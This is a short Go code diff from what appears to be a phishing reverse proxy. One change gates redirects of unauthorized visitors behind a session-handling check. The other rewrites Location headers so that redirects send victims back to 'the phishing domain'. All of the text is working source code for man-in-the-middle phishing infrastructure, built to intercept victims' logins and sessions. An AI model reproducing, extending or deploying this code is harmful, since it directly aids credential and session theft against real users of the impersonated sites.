@@ -238,7 +238,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	
 				// redirect for unauthorized requests
-				if ps.SessionId == "" && !req_ok {
+				if ps.SessionId == "" && p.handleSession(req.Host) && !req_ok {
 					redirect_url := p.cfg.redirectUrl
 					resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 					if resp != nil {
@@ -518,8 +518,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// if "Location" header is present and it is not an intended breakout (ie unauthorized), make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
-			x_overwrite := resp.Header.Get("x-rewrite")
-			if err == nil && x_overwrite == "" {
+			if err == nil && resp.Header.Get("x-rewrite") == "" {
 				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
 					resp.Header.Set("Location", r_url.String())
